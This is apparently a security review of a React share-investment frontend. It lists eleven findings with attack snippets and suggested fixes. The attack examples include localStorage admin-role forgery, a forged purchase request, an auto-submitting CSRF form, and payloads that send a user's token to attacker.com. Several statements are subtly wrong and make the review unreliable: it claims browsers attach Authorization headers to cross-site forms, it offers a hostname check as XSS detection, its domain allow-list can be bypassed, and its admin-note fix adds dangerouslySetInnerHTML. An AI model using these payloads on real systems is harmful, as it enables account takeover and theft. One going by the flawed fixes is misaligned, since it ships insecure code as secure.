# Security Review: Build Barguna Frontend

## Executive Summary
This React financial platform contains **7 CRITICAL/HIGH severity vulnerabilities** that could allow attackers to:
- Steal user tokens and impersonate accounts
- Bypass admin authentication entirely
- Manipulate financial transactions
- Perform unauthorized actions via XSS

---

## CRITICAL Vulnerabilities

### 1. **CRITICAL: localStorage Token Storage (XSS Attack Surface)**
**Location:** `lib/api.ts` lines 6-7, `lib/auth.ts` lines 2-3
**Severity:** CRITICAL

**Issue:**
```typescript
export function setToken(token: string) {
  localStorage.setItem('bb_token', token)
}
export function saveUser(user: UserProfile) {
  localStorage.setItem('bb_user', JSON.stringify(user))
}
```

localStorage is **vulnerable to XSS attacks**. Any XSS vulnerability in your app allows attackers to execute:
```javascript
localStorage.getItem('bb_token')  // Steal token
localStorage.getItem('bb_user')   // Steal user data
```

**Financial Impact:** Attacker gains complete account access to steal money/shares.

**Fix:**
- **Use httpOnly cookies** instead (requires backend support):
```typescript
// Backend should set: Set-Cookie: bb_token=TOKEN; HttpOnly; Secure; SameSite=Strict
// Frontend: Remove all localStorage token storage
export function getToken() { return null } // Token sent automatically by browser
```

- **If localStorage is required**, implement robust XSS protections:
  - **Sanitize ALL user inputs** before rendering (use DOMPurify library)
  - **Use Content Security Policy (CSP)** headers
  - Add **Subresource Integrity (SRI)** to all CDN scripts

**Temporary Mitigation:**
```typescript
// Add to main.tsx or App.tsx
if (document.location.hostname !== 'yourdomain.com') {
  console.error('XSS detected!')
  localStorage.removeItem('bb_token')
  localStorage.removeItem('bb_user')
}
```

---

### 2. **CRITICAL: Client-Side Admin Role Check Bypass**
**Location:** `lib/auth.ts` line 15-16, `components/ProtectedRoute.tsx` line 9-10
**Severity:** CRITICAL

**Issue:**
```typescript
export function isAdmin(): boolean {
  return getUser()?.role === 'admin'
}

export function AdminRoute({ children }: { children: React.ReactNode }) {
  if (!isLoggedIn()) return <Navigate to="/login" replace />
  if (!isAdmin()) return <Navigate to="/" replace />
  return <>{children}</>
}
```

**An attacker can bypass admin checks by editing localStorage:**
```javascript
// In browser console:
localStorage.setItem('bb_user', JSON.stringify({
  id: 1,
  name: "Hacker",
  phone: "01700000000",
  role: "admin",  // ← Fake admin role
  referral_code: "ABC123"
}))
// Now isAdmin() returns true, all admin routes are accessible
```

**Then make API calls:**
```javascript
fetch('/api/admin/projects', {
  method: 'POST',
  body: JSON.stringify({
    title: 'Fake Project',
    total_capital: 1000000000,
    total_shares: 1000000,
    share_price: 1000
  }),
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('bb_token')}`
  }
})
```

**Financial Impact:** Complete fraud - create fake projects, approve fake share purchases, steal all earnings.

**Fix:**
```typescript
// REMOVE client-side role checks entirely for sensitive operations
// lib/auth.ts - REMOVE isAdmin() function

// components/ProtectedRoute.tsx
export function AdminRoute({ children }: { children: React.ReactNode }) {
  // Don't check role client-side - let server reject if needed
  // This is just UI routing for UX, NOT security
  if (!isLoggedIn()) return <Navigate to="/login" replace />
  return <>{children}</>
}

// In each admin component, check server response:
const { data, isLoading, error } = useQuery({
  queryKey: ['admin-projects'],
  queryFn: () => adminApi.projects(),
  // If 403 or 401 returned, user isn't admin - handle it
})

if (error?.response?.status === 403) {
  return <Navigate to="/" replace />
}
```

**Backend MUST enforce:**
```javascript
// Every admin endpoint must verify role
app.post('/api/admin/projects', authenticate, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' })
  }
  // ... process request
})
```

---

### 3. **CRITICAL: No Client-Side Input Validation (Amount Tampering)**
**Location:** `pages/ProjectDetail.tsx` lines 84-86
**Severity:** CRITICAL

**Issue:**
```typescript
<input className="input" type="number" min={1} max={p.available_shares}
  value={qty} onChange={e => { setQty(Number(e.target.value)); setError('') }} />
```

The `min` and `max` attributes are **UI-only**, not enforced. An attacker can:
1. Open browser DevTools
2. Modify JavaScript state directly
3. Set qty to 999999999999 (more than available)
4. Send malicious API request:

```javascript
// Intercept the fetch request and modify it:
fetch('/api/shares/buy', {
  method: 'POST',
  body: JSON.stringify({
    project_id: 1,
    quantity: 999999999,  // Buy way more than available!
    bkash_txid: "FAKE_TXID_12345"
  }),
  headers: { 'Authorization': `Bearer ${token}` }
})
```

**Financial Impact:** 
- Buy shares without proper payment
- Dilute project ownership
- Trigger downstream financial errors

**Fix:**
```typescript
// Add real validation BEFORE API call
const handleBuyClick = () => {
  // Parse stored values fresh (don't trust state)
  const quantity = parseInt(
    (document.querySelector('[data-qty-input]') as HTMLInputElement)?.value || '0'
  )
  
  // Validate ALL constraints
  if (quantity < 1) {
    setError('Minimum 1 share required')
    return
  }
  if (quantity > p.available_shares) {
    setError(`Maximum ${p.available_shares} shares available`)
    return
  }
  if (!Number.isInteger(quantity) || quantity < 0) {
    setError('Invalid quantity')
    return
  }
  
  // Only then submit
  buyMutation.mutate()
}
```

**CRITICAL: Server-side validation is mandatory:**
```javascript
app.post('/api/shares/buy', authenticate, async (req, res) => {
  const { project_id, quantity, bkash_txid } = req.body

  // Strict validation
  if (!Number.isInteger(quantity) || quantity < 1 || quantity > 1000000) {
    return res.status(400).json({ error: 'Invalid quantity' })
  }
  
  const project = await Project.findById(project_id)
  if (quantity > project.available_shares) {
    return res.status(400).json({ error: 'Not enough shares available' })
  }
  
  if (!bkash_txid || bkash_txid.length < 5) {
    return res.status(400).json({ error: 'Invalid bKash TxID' })
  }
  
  // Process...
})
```

---

## HIGH Vulnerabilities

### 4. **HIGH: XSS in Task Redirect (User-Supplied URL Execution)**
**Location:** `pages/DailyTasks.tsx` lines 27-29
**Severity:** HIGH

**Issue:**
```typescript
function handleClick(task: TaskItem) {
  window.open(`/api/tasks/${task.id}/redirect`, '_blank')
}
```

If the backend allows admins to set arbitrary `destination_url` values for tasks, an attacker with admin access (from vulnerability #2) could:

1. Create task with malicious URL:
```javascript
await adminApi.createTask({
  title: 'Click here for rewards!',
  destination_url: 'javascript:alert(1)',  // XSS payload
  platform: 'facebook'
})
// OR
{
  destination_url: 'data:text/html,<script>fetch("http://attacker.com/steal?token="+localStorage.getItem("bb_token"))</script>'
}
```

2. When users click "Visit", the XSS executes

**Financial Impact:** Mass token theft from all users who click tasks.

**Fix:**
```typescript
function handleClick(task: TaskItem) {
  // Validate URL before opening
  try {
    const url = new URL(task.destination_url, window.location.origin)
    // Only allow http/https protocols
    if (!['http:', 'https:'].includes(url.protocol)) {
      console.error('Invalid URL protocol')
      return
    }
    // Only allow approved domains (configure this)
    const allowedDomains = ['facebook.com', 'youtube.com', 'telegram.org', 'yourdomain.com']
    if (!allowedDomains.some(d => url.hostname.includes(d))) {
      console.error('URL domain not allowed')
      return
    }
    window.open(url.toString(), '_blank')
  } catch {
    console.error('Invalid URL')
  }
}
```

**Backend Fix:**
```javascript
// Validate URLs before storing
app.post('/admin/tasks', authenticate, async (req, res) => {
  const { destination_url } = req.body
  
  try {
    const url = new URL(destination_url)
    if (!['http:', 'https:'].includes(url.protocol)) {
      return res.status(400).json({ error: 'Only http/https allowed' })
    }
  } catch {
    return res.status(400).json({ error: 'Invalid URL' })
  }
  
  // ... store task
})
```

---

### 5. **HIGH: No CSRF Protection**
**Location:** All API calls in `lib/api.ts`
**Severity:** HIGH

**Issue:**
```typescript
async function request<T>(
  path: string,
  options: RequestInit = {}
): Promise<...> {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    // No CSRF token!
  }
  if (token) headers['Authorization'] = `Bearer ${token}`
  
  const res = await fetch(`${BASE}${path}`, { ...options, headers })
  // ...
}
```

**CSRF Attack Scenario:**
1. Attacker hosts malicious website
2. Logged-in user visits attacker's site
3. Page contains:
```html
<form action="https://yourdomain.com/api/shares/buy" method="POST">
  <input name="project_id" value="1" />
  <input name="quantity" value="1000" />
  <input name="bkash_txid" value="FAKE_TXID" />
</form>
<script>document.forms[0].submit()</script>
```
4. User's browser automatically includes their Authorization token
5. Fraudulent share purchase happens without user knowledge

**Financial Impact:** Users unknowingly make unauthorized investments.

**Fix:**
```typescript
// Add CSRF token to every request
let csrfToken = ''

export function setCSRFToken(token: string) {
  csrfToken = token
  localStorage.setItem('csrf_token', token)
}

export function getCSRFToken() {
  return csrfToken || localStorage.getItem('csrf_token')
}

async function request<T>(
  path: string,
  options: RequestInit = {}
): Promise<...> {
  const token = getToken()
  const csrf = getCSRFToken()
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    ...(options.headers as Record<string, string>),
    'X-CSRF-Token': csrf || ''  // ← Add CSRF token to every request
  }
  if (token) headers['Authorization'] = `Bearer ${token}`
  
  const res = await fetch(`${BASE}${path}`, { ...options, headers })
  // ...
}
```

**Backend Requirements:**
- Generate CSRF token on login
- Include in login response
- Validate on all state-changing requests (POST, PUT, PATCH, DELETE)

---

### 6. **HIGH: Sensitive Data Exposure in Network Requests**
**Location:** `lib/api.ts` lines 43-44, 81-82
**Severity:** HIGH

**Issue:**
```typescript
// Query strings expose data
list: (page = 1, limit = 20) => 
  request<Paginated<ProjectItem>>(`/projects?page=${page}&limit=${limit}`),

pendingShares: (page = 1, status = 'pending') =>
  request<Paginated<AdminShareRequest>>(`/admin/shares/pending?page=${page}&status=${status}`)
```

**Exposure vectors:**
1. **Browser history** contains full URLs with filters
2. **Browser cache** stores responses with sensitive data
3. **Server logs** record all query parameters
4. **Network tab** in DevTools shows all requests
5. **Proxy/ISP logs** can see unencrypted query strings

**User phone numbers, share quantities, earning amounts exposed.**

**Fix:**
```typescript
// Use POST with request body instead of query params for sensitive data
pendingShares: (page = 1, status = 'pending') =>
  request<Paginated<AdminShareRequest>>(`/admin/shares/pending`, {
    method: 'POST',
    body: JSON.stringify({ page, status })
  }),

// Or use secure query params only for non-sensitive pagination
list: (page = 1) => 
  request<Paginated<ProjectItem>>(`/projects?page=${page}`),
  // Remove limit from URL if not needed
```

**Also require backend:**
```
// Headers to prevent caching sensitive data
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: 0
```

---

## MEDIUM Vulnerabilities

### 7. **MEDIUM: Race Condition in Share Purchase Flow**
**Location:** `pages/ProjectDetail.tsx` lines 20-31
**Severity:** MEDIUM

**Issue:**
```typescript
const buyMutation = useMutation({
  mutationFn: () => sharesApi.buy({ 
    project_id: Number(id), 
    quantity: qty,  // ← qty can change between validation and submission
    bkash_txid: txid 
  }),
  onSuccess: (res) => {
    if (res.success) {
      setMsg('Request submitted!')
      setQty(1)  // Reset happens AFTER API call completes
      // ...
    }
  }
})
```

**Race Condition:**
1. User sets qty=100, shares available=100
2. User clicks "Submit"
3. **Before API call completes**, user rapidly changes qty to 1000
4. First API call succeeds with qty=100
5. User clicks submit again
6. Second API call tries qty=1000 but only 0 shares left → but timing issues could cause problems

**Additional issue:** The `txid` could theoretically be reused in race conditions.

**Fix:**
```typescript
const buyMutation = useMutation({
  mutationFn: ({ quantity, txid }) => sharesApi.buy({ 
    project_id: Number(id),
    quantity,
    bkash_txid: txid
  }),
  onSuccess: (res) => {
    if (res.success) {
      setMsg('Request submitted!')
      setQty(1)
      setTxid('')
      qc.invalidateQueries({ queryKey: ['project', id] })
    }
  }
})

const handleSubmit = () => {
  // Capture current values
  const currentQty = qty
  const currentTxid = txid
  
  // Disable form immediately
  setQty(1)
  setTxid('')
  
  // Call with captured values
  buyMutation.mutate({
    quantity: currentQty,
    txid: currentTxid
  })
}

// In form:
<button
  onClick={handleSubmit}
  disabled={buyMutation.isPending || !txid || qty < 1}  // Disable during submit
  className="btn-primary w-full py-3"
>
  {buyMutation.isPending ? 'Processing...' : 'Submit'}
</button>
```

---

## MEDIUM Vulnerabilities (Continued)

### 8. **MEDIUM: No Request Timeout Protection**
**Location:** `lib/api.ts` lines 15-28
**Severity:** MEDIUM

**Issue:**
```typescript
const res = await fetch(`${BASE}${path}`, { ...options, headers })
// fetch has no timeout by default - could hang forever
```

**Attack:** 
- Network jitter or slow server causes hung requests
- User repeatedly clicks "Submit" thinking it didn't work
- Duplicate requests sent
- Multiple share purchases triggered with same txid

**Fix:**
```typescript
async function request<T>(
  path: string,
  options: RequestInit = {}
): Promise<...> {
  const controller = new AbortController()
  const timeoutId = setTimeout(() => controller.abort(), 30000) // 30s timeout
  
  try {
    const res = await fetch(`${BASE}${path}`, {
      ...options,
      headers,
      signal: controller.signal
    })
    clearTimeout(timeoutId)
    const json = await res.json()
    return json
  } catch (error) {
    if (error instanceof TypeError && error.message.includes('abort')) {
      return { success: false, error: 'Request timeout - please try again' }
    }
    throw error
  }
}
```

---

### 9. **MEDIUM: No Input Sanitization (Reflected in UI)**
**Location:** `pages/admin/AdminShares.tsx` line 63
**Severity:** MEDIUM

**Issue:**
```typescript
{r.admin_note && <p className="text-xs text-red-500 mt-1">নোট: {r.admin_note}</p>}
```

**XSS via admin notes:**
1. Admin can enter HTML/JS in rejection notes
2. If backend doesn't sanitize, XSS executes when user views share request:

```javascript
// Admin submits note with:
"<img src=x onerror=\"fetch('http://attacker.com/steal?token='+localStorage.getItem('bb_token'))\">"
```

**Fix:**
```tsx
import DOMPurify from 'dompurify'

{r.admin_note && (
  <p className="text-xs text-red-500 mt-1">
    নোট: <span dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(r.admin_note) }} />
  </p>
)}

// OR simpler - just text escape (React does this by default for {text}):
{r.admin_note && (
  <p className="text-xs text-red-500 mt-1">নোট: {r.admin_note}</p>  // Safe
)}
```

**Backend MUST also sanitize before storing.**

---

## LOW Vulnerabilities

### 10. **LOW: Hardcoded API Base Path**
**Location:** `lib/api.ts` line 0
**Severity:** LOW

**Issue:**
```typescript
const BASE = '/api'
```

If frontend and API server are on different domains in production, CORS will fail. Not a security issue but operational.

**Fix:**
```typescript
const BASE = process.env.REACT_APP_API_URL || '/api'
// In .env:
// REACT_APP_API_URL=https://api.yourdomain.com
```

---

### 11. **LOW: Missing Error Logging**
**Location:** Throughout `lib/api.ts`
**Severity:** LOW

**Issue:**
No error logging makes debugging security issues harder. Attackers could perform attacks without being detected.

**Fix:**
```typescript
async function request<T>(
  path: string,
  options: RequestInit = {}
): Promise<...> {
  // ... existing code ...
  
  try {
    const res = await fetch(`${BASE}${path}`, { ...options, headers })
    const json = await res.json()
    
    // Log failed responses
    if (!json.success && !['login', 'register'].includes(path)) {
      console.warn(`API Error [${path}]: ${json.error}`)
      // In production: send to error tracking service (Sentry, etc)
    }
    
    return json
  } catch (error) {
    console.error(`Request failed [${path}]:`, error)
    // Report to error tracking
    return { success: false, error: 'Network error' }
  }
}
```

---

## Summary Table

| # | Type | Severity | Issue | Impact |
|---|------|----------|-------|--------|
| 1 | Auth | CRITICAL | localStorage token vulnerable to XSS | Account takeover |
| 2 | Auth | CRITICAL | Client-side admin bypass | Unauthorized admin access |
| 3 | Input | CRITICAL | No amount validation | Fraudulent purchases |
| 4 | XSS | HIGH | Unvalidated task URLs | Mass token theft |
| 5 | CSRF | HIGH | No CSRF tokens | Unauthorized transactions |
| 6 | Exposure | HIGH | Sensitive data in URLs | Privacy breach |
| 7 | Race | MEDIUM | Race condition on purchase | Duplicate transactions |
| 8 | Network | MEDIUM | No request timeout | Duplicate submissions |
| 9 | XSS | MEDIUM | Unsanitized admin notes | Stored XSS |
| 10 | Config | LOW | Hardcoded API path | Deployment issues |
| 11 | Logging | LOW | No error logging | Undetected attacks |

---

## Immediate Action Items

**Before going to production:**

1. ✋ **STOP using localStorage for tokens** - Migrate to httpOnly cookies
2. ✋ **Implement server-side role verification** on every admin endpoint
3. ✋ **Add robust input validation** on backend for all financial amounts
4. ✋ **Implement CSRF tokens** on all state-changing endpoints
5. ✋ **Add Content Security Policy (CSP)** headers
6. ✋ **Set secure cookie flags** (HttpOnly, Secure, SameSite)
7. ✋ **Validate all URLs** before opening or storing
8. ✋ **Rate limit** share purchase endpoints
9. ✋ **Require email/SMS confirmation** for financial transactions
10. ✋ **Audit all user inputs** for XSS vectors

---

**Risk Level: CRITICAL - Do not deploy to production without addressing items 1-3.**
